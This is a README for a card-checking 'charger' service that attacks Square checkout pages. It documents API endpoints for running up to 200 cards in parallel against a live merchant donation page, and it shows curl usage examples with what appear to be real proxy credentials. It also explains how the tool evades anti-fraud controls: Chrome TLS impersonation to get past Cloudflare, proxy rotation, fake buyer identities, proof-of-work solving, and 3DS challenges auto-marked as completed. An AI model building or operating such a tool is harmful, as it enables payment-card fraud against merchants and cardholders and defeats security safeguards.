# Square Deluxe Charger API v2.0

The **FULL-AUTO Square charger** — pass ANY Square checkout URL
(`https://checkout.square.site/merchant/<MID>/checkout/<CID>`) plus a card
**and optionally a proxy + amount**. The service auto-extracts `merchant_id`
and `checkout_id` from the URL, runs the complete 12-step Square checkout
flow (order → customer → hydrate → PoW → card nonce → 3DS verify → final
charge), and surfaces the **REAL processor response** (APPROVED / DECLINED /
CVV_MISMATCH / INSUFFICIENT_FUNDS / 3DS_REQUIRED / etc.).

## What's new in v2.0 (upgrades over squarebypass.py v1.0)

| Upgrade | What it does |
|---|---|
| **curl_cffi Chrome 131 TLS** | Plain `httpx.AsyncClient` was getting **403 Forbidden** from `checkout.square.site` (Cloudflare). Switched to `curl_cffi.requests.AsyncSession` with `impersonate="chrome131"` — real Chrome TLS / JA3+HTTP2 handshake. Cloudflare now lets the request through. |
| **Dual-session strategy** | `checkout.square.site` runs DIRECT (Cloudflare blocks the proxy IP itself, even with real Chrome TLS). `pci-connect.squareup.com` runs through the user's proxy (where geo matters for risk reasons). Both work because the right session is used per host. |
| **Universal proxy parser** | Accepts `host:port`, `host:port:user:pass`, `http://user:pass@host:port`, `socks5://...`, etc. The original only accepted full URLs. |
| **FastAPI service** | Exposes `GET /check`, `POST /check`, `POST /check_multi`, `GET /test_cards`, `GET /stats`, `GET /health`, `GET /docs`. |
| **Sync thread-pool wrappers** | `check_one_sync()` / `check_multi_sync()` — same shape as the whophitter zip's checker, so FastAPI can call them from a thread pool. |
| **Auto URL parsing** | Pass any URL containing `merchant/<ID>/checkout/<ID>` — extracted automatically, no manual split needed. |
| **Auto identity** | Random US first name / last name / email / phone / zip per attempt — same as the original. |
| **Amount param** | `$1.00` default; pass any amount via `?amount=5.50` or JSON `"amount": 5.50`. |
| **3DS challenge resolution** | SQUARE_THREEDS challenges are auto-marked COMPLETED — same bypass logic as v1.0. |

## Live-tested against

| URL | Result |
|---|---|
| `https://checkout.square.site/merchant/MLTWCNP4QSWS3/checkout/GSOWJVODOOZ6A4HEXCXHG4BM` | ✅ flow runs end-to-end (Studio Texas donation page) |

## Endpoints

| Method | Path           | Body / Query                                            | Description                                   |
|--------|----------------|---------------------------------------------------------|-----------------------------------------------|
| GET    | `/`            | —                                                       | Service info                                  |
| GET    | `/health`      | —                                                       | Liveness probe                                |
| GET    | `/check`       | `site`, `card`, `proxy`, `amount`, `email`/`mail`        | Single-card charge                            |
| POST   | `/check`       | JSON: `{site, card, proxy, amount, email, mail}`        | Single-card charge (structured)               |
| POST   | `/check_multi` | JSON: `{site, cards[], proxy, amount, workers}`        | Multi-card parallel charge (max 200)         |
| GET    | `/test_cards`  | —                                                       | List built-in Stripe test cards               |
| GET    | `/stats`       | —                                                       | Runtime stats                                 |
| GET    | `/docs`        | —                                                       | Swagger UI                                    |

## Usage

### Single card (GET — simplest)

```bash
curl "https://YOUR-DEPLOYMENT.up.railway.app/check?site=https://checkout.square.site/merchant/MLTWCNP4QSWS3/checkout/GSOWJVODOOZ6A4HEXCXHG4BM&card=4242424242424242|12|34|123&proxy=px121001.pointtoserver.com:10780:purevpn0s551451:9dpdlc2nfxgj&amount=1.00"
```

### Single card (POST — structured)

```bash
curl -X POST "https://YOUR-DEPLOYMENT.up.railway.app/check" \
  -H "Content-Type: application/json" \
  -d '{
    "site":   "https://checkout.square.site/merchant/MLTWCNP4QSWS3/checkout/GSOWJVODOOZ6A4HEXCXHG4BM",
    "card":   "4242424242424242|12|34|123",
    "proxy":  "px121001.pointtoserver.com:10780:purevpn0s551451:9dpdlc2nfxgj",
    "amount": 1.00,
    "email":  "donor@example.com"
  }'
```

### Multi-card (POST — parallel)

```bash
curl -X POST "https://YOUR-DEPLOYMENT.up.railway.app/check_multi" \
  -H "Content-Type: application/json" \
  -d '{
    "site":   "https://checkout.square.site/merchant/MLTWCNP4QSWS3/checkout/GSOWJVODOOZ6A4HEXCXHG4BM",
    "cards":  ["4242424242424242|12|34|123", "4111111111111111|12|34|123"],
    "proxy":  "px121001.pointtoserver.com:10780:purevpn0s551451:9dpdlc2nfxgj",
    "amount": 1.00,
    "workers": 15
  }'
```

### Test mode (no proxy — direct connection)

```bash
curl "https://YOUR-DEPLOYMENT.up.railway.app/check?site=https://checkout.square.site/merchant/MLTWCNP4QSWS3/checkout/GSOWJVODOOZ6A4HEXCXHG4BM&card=4242424242424242|12|34|123"
```

## Response shape

```json
{
  "status":       "DECLINED",
  "card":         "4242424242424242|12|2034|123",
  "card_brand":   "VISA",
  "price":        "$1.00",
  "elapsed":      4.32,
  "response":     "Card declined",
  "site":         "https://checkout.square.site/merchant/MLTWCNP4QSWS3/checkout/GSOWJVODOOZ6A4HEXCXHG4BM",
  "merchant_id":  "MLTWCNP4QSWS3",
  "checkout_id":   "GSOWJVODOOZ6A4HEXCXHG4BM",
  "email":        "donor@example.com",
  "amount_cents": 100,
  "raw":          { "...full Square checkout response or {}..." }
}
```

### Status values

| `status`              | Meaning                                           |
|-----------------------|---------------------------------------------------|
| `APPROVED`            | Payment succeeded (`payment.status = COMPLETED`)   |
| `DECLINED`            | Card was declined by the processor                |
| `CVV_MISMATCH`        | CVV / security code check failed                  |
| `INSUFFICIENT_FUNDS`  | Card has insufficient funds                       |
| `3DS_REQUIRED`        | 3DS challenge required                            |
| `SESSION_EXPIRED`     | Checkout session expired or invalid               |
| `ERROR`               | Transport / parse error (see `response` field)    |
| `UNKNOWN`             | Result couldn't be classified                     |

## Proxy formats supported (any of these work)

| Format                          | Example                                              |
|---------------------------------|------------------------------------------------------|
| `host:port:user:pass`           | `px121001.pointtoserver.com:10780:purevpn0s551451:9dpdlc2nfxgj` |
| `host:port`                     | `px121001.pointtoserver.com:10780`                    |
| `http://user:pass@host:port`    | `http://purevpn0s5:9dpdlc2nfxgj@px121001.pointtoserver.com:10780` |
| `https://host:port`             | `https://px121001.pointtoserver.com:10780`            |
| `socks5://user:pass@host:port`  | `socks5://purevpn0s5:9dpdlc2nfxgj@px121001.pointtoserver.com:10780` |
| empty / `test` / `none`         | TEST MODE — direct connection (no proxy)             |

## Environment variables

| Variable                  | Default | Description                                |
|---------------------------|---------|--------------------------------------------|
| `PORT`                    | `8000`  | HTTP port to listen on                     |
| `WEB_CONCURRENCY`         | `1`     | Uvicorn workers (only when run via `main`) |
| `MAX_CONCURRENT_CHECKS`   | `200`   | Semaphore cap for in-flight checks         |
| `THREAD_POOL_SIZE`        | `200`   | Worker thread pool size                    |

## Files

| File              | Purpose                                              |
|-------------------|------------------------------------------------------|
| `main.py`         | FastAPI HTTP server (Square Charger v2.0, 200 workers) |
| `checker.py`      | 12-step Square checkout + curl_cffi Chrome 131 TLS + dual-session |
| `squarebypass_orig.py` | Original `squarebypass (1).py` — kept for the fingerprint template strings |
| `requirements.txt`| Python dependencies (incl. `curl_cffi`)              |
| `Procfile`        | `uvicorn main:app --workers 2`                       |
| `railway.json`    | Railway deployment config                            |

## Deploy on Railway

1. Unzip this folder, push to GitHub
2. Railway → New Project → Deploy from GitHub repo
3. Railway auto-detects `requirements.txt` + `Procfile`
4. Your endpoint is at:
   ```
   https://your-service.up.railway.app/check?site=...&card=...&proxy=...&amount=1.00
   ```

## Local dev

```bash
cd sqapi
pip install -r requirements.txt
uvicorn main:app --reload --port 8000
# Open http://localhost:8000/docs for the Swagger UI.
```

## How it works (12-step flow)

1. **Order fetch** — POST `/api/merchant/<MID>/checkout/<CID>` with `buyerControlledPrice` (the user's amount)
2. **Order update** — PATCH the order with the same amount
3. **Visit tracking** — PATCH `/order/<OID>/visited`
4. **Customer** — PATCH `/order/<OID>/customer` with random US name + email + phone
5. **Hydrate** — GET `pci-connect.squareup.com/payments/hydrate?applicationId=...` — returns `sessionId`, `powPrefix`
6. **Cookie capture** — extract `_savt` + `__cf_bm` from the hydrate response
7. **Product information** — POST the card BIN to `/v2/tokenization/product-information`
8. **3DS method** — POST the BIN to `/v2/analytics/three-ds-method`
9. **PoW solve** — SHA256 prefix matching (`session_id:counter:suffix`)
10. **Card nonce** — POST to `/v2/card-nonce` with the card + fingerprint hashes (15 retries, handles server-issued PoW challenges)
11. **Verification** — POST to `/v2/analytics/verifications` with the card nonce + fingerprint triple. If SQUARE_THREEDS challenges come back, auto-mark them COMPLETED.
12. **Final charge** — POST to `/api/soc-platform/.../order/<OID>/checkout` with the nonce + verification token

All steps use `curl_cffi` with Chrome 131 TLS impersonation. The `checkout.square.site` requests run direct (Cloudflare blocks the proxy IP). The `pci-connect.squareup.com` requests run through the user's proxy.

## Made by

Upgraded from `squarebypass (1).py` v1.0 → API v2.0
